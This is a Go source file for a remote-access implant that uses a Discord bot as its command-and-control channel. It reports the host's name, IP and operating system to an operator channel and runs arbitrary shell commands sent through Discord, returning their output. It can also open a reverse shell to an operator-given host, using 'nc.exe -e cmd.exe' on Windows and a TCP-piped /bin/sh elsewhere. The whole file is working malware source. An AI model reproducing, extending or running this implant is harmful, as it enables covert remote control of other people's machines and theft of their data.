package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
	"strconv"

	"DiscordGo/pkg/agent"
	"DiscordGo/pkg/message"
	"DiscordGo/pkg/util"
	"DiscordGo/pkg/util/constants"

	"github.com/bwmarrin/discordgo"
)

var newAgent *agent.Agent

// Create an Agent
func init() {
	newAgent = &agent.Agent{}
	newAgent.UUID = util.GenerateUUID()
	newAgent.HostName, _ = os.Hostname()
	newAgent.IP = util.GetLocalIP()

	sys := "Unknown"
	if runtime.GOOS == "windows" {
		sys = "Windows"
	} else if runtime.GOOS == "linux" {
		sys = "Linux"
	} else if runtime.GOOS == "darwin" {
		sys = "MacOS"
	}

	newAgent.OS = sys
}

func main() {
	dg, err := discordgo.New("Bot " + constants.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	if util.DEBUG {
		fmt.Println("New Agent Info")
		fmt.Println(newAgent.HostName)
		fmt.Println(newAgent.UUID)
		fmt.Println(newAgent.IP)
		fmt.Println(newAgent.OS)
		fmt.Println()
	}

	firstMessage := newAgent.HostName + ":" + newAgent.IP + ":" + newAgent.OS
	sendMessage := message.NewMessage(newAgent.UUID, firstMessage, false, false, message.MESSAGE_NEW)
	dg.ChannelMessageSend(constants.ChannelID, sendMessage)

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreator)
	// dg.AddHandler(heartBeat)
	go heartBeat(dg)

	// ping the server every minute
	// pulseDelay := time.Duration(10)
	// tick := time.NewTicker(time.Second * pulseDelay)
	// go heartbeat(dg, tick)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		// fmt.Println("error opening connection,", err)
		return
	}

	if util.DEBUG {
		fmt.Println("Agent is now running.  Press CTRL-C to exit.")
	}
	// Wait here until CTRL-C or other term signal is received.
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	lastMessage := "[-] Agent " + newAgent.UUID + " has disconnected"
	sendLMessage := message.NewMessage(newAgent.UUID, lastMessage, false, false, message.MESSAGE_DISCONNECT)
	dg.ChannelMessageSend(constants.ChannelID, sendLMessage)

	// Cleanly close down the Discord session.
	dg.Close()

}

func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {

	var messageJSON message.Message
	json.Unmarshal([]byte(m.Content), &messageJSON)

	// Check if the message is for me
	forMe := false

	if messageJSON.AgentID == newAgent.UUID {
		forMe = true
	}

	if forMe {
		if messageJSON.MessageType == message.MESSAGE_COMMAND {
			result := executeCommand(messageJSON.Message)

			// if the result is more than discord character limit
			// TODO: Divide the results and send it with id
			// {Larger output id:1}
			// {Larger output id:2}
			if len(result) > 2000 {

				fmt.Println("Large output coming up....")
				println(result)

			} else {
				sendMessage := message.NewMessage(newAgent.UUID, result, false, false, message.MESSAGE_OUTPUT)
				dg.ChannelMessageSend(constants.ChannelID, sendMessage)
			}
		} else if messageJSON.MessageType == message.MESSAGE_PING {
			message.Pong(dg, newAgent.UUID, false)
		} else if messageJSON.MessageType == message.MESSAGE_KILL {
			sendLMessage := message.NewMessage(newAgent.UUID, "", false, false, message.MESSAGE_DISCONNECT)
			dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
			// Exit peacefully
			dg.Close()
			os.Exit(0)
		} else if messageJSON.MessageType == message.MESSAGE_SHELL {
			if newAgent.OS == "Windows" {
				sp := strings.Split(messageJSON.Message, ":")
				fmt.Println(sp[0])
				// TODO: Why use nc? find a better solution
				_ = executeCommand("nc.exe -e cmd.exe " + sp[0] + " 4444")
			} else {
				reverseShell(messageJSON.Message)
			}
		} 
		// else if messageJSON.MessageType == message.MESSAGE_PONG {
		// 	println("message:" + messageJSON.Message)
		// }
	}
}

func heartBeat(dg *discordgo.Session){
	// fmt.Println("1 minute")
	// sendLMessage := message.NewMessage(newAgent.UUID, "", false, false, message.MESSAGE_HEARTBEAT)
	// dg.ChannelMessageSend(constants.ChannelID, sendLMessage)

	// ping the server every minute
	pulseDelay := time.Duration(60)
	tick := time.NewTicker(time.Second * pulseDelay)
	// go heartbeat(dg, tick)
	for t := range tick.C {
		fmt.Printf("%v:%v\n", t.Minute(), t.Second())
		sendLMessage := message.NewMessage(newAgent.UUID, strconv.Itoa(t.Minute()) + ":" + strconv.Itoa(t.Second()), false, false, message.MESSAGE_HEARTBEAT)
		dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
	}
}

func executeCommand(command string) string {
	args := ""
	result := ""
	var shell, flag string
	var testcmd = command

	if runtime.GOOS == "windows" {
		shell = "cmd"
		flag = "/c"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}

	// Seperate args from command
	ss := strings.Split(command, " ")
	command = ss[0]

	if len(ss) > 1 {
		for i := 1; i < len(ss); i++ {
			args += ss[i] + " "
		}
		args = args[:len(args)-1] // I HATEEEEEEEE GOLANGGGGGG
	}

	if args == "" {
		output, err := exec.Command(shell, flag, command).Output()
		// output, err := exec.Command(command).Output()

		if err != nil {
			// maybe send error to server
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}

		result = string(output)
		if util.DEBUG {
			fmt.Println("Result: " + result)
			fmt.Println(len(result))
		}

	} else {
		// output, err := exec.Command(shell, flag, command, args).Output()
		output, err := exec.Command(shell, flag, testcmd).Output()
		if err != nil {
			// maybe send error to server
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}

		result = string(output)
		if util.DEBUG {
			fmt.Println("Result: " + result)
			fmt.Println(len(result))
		}
	}
	return result
}

// https://stackoverflow.com/questions/49674855/build-error-unknown-field-hidewindow
func reverseShell(host string) {
	fmt.Println("Host: " + host)
	conn, err := net.Dial("tcp", host)
	if err != nil {
		fmt.Println("Could not connect to server")
		conn.Close()
		return
	}

	sh := exec.Command("/bin/sh")
	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
	sh.Run()
	conn.Close()
}

func heartbeat(dg *discordgo.Session, tick *time.Ticker) {
	for t := range tick.C {
		pingTheServer(dg, t)
	}
}

// Attempt to ping the server to let them know we are still alive and kicking. This will (in theory) remain persistent even if the server resets etc
func pingTheServer(dg *discordgo.Session, tick time.Time) {
	fmt.Println("1 minute")
	newMessage := message.NewMessage(newAgent.UUID, "Ping at " + tick.String(), false, false, message.MESSAGE_PING)
	dg.ChannelMessageSend(constants.ChannelID, newMessage)
}